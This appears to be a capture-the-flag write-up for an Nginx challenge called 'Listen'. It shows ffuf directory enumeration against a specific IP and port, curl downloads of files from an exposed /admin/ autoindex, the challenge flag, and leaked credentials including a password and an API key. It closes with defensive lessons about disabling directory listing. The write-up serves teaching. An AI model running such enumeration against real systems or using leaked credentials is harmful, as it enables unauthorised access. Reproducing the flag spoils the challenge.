#  Writeup - Listen

## Challenge Overview
We discovered a web service running on **Nginx** (port `12776`).  
The challenge description suggested that misconfiguration might expose hidden directories and sensitive information.

## Reconnaissance
1. **Directory Enumeration**
   Using `ffuf` with the common wordlist:
   ```bash
   ffuf -u http://8.216.34.114:12776/FUZZ -w /usr/share/wordlists/dirb/common.txt
  Results:
  
  bash
  /admin   [301]
  /docs    [301]
  /public  [301]
  /index.html [200]
  The /admin/ directory was interesting because it often contains restricted files.

## Exploitation – Accessing /admin/
Navigating to /admin/ returned an autoindex page:
  admin-only.txt
  secrets.conf

## Downloading both files:

```bash
curl -O http://8.216.34.114:12776/admin/admin-only.txt
curl -O http://8.216.34.114:12776/admin/secrets.conf
Reading admin-only.txt:
cybercon{nginx_star_residents_are_listening_to_us}
```


## Secrets
  The secrets.conf file leaked sensitive information:
  ```bash
  admin_user=galactic_commander
  admin_pass=nginx_star_protocol_42
  db_connection=quantum://admin:cosmic_key@nginx-star.galaxy/universal_db
  api_key=sk_live_nginx_star_42ctf_galaxy_protocol
  This confirmed that the server was misconfigured with directory listing enabled.
  ```

## Lessons Learned
  Directory listing should always be disabled in production (autoindex off;).
  Sensitive credentials should never be stored in web-accessible paths.
  A single misconfiguration can leak both the flag and internal secrets.

## Final Flag
  cybercon{nginx_star_residents_are_listening_to_us}
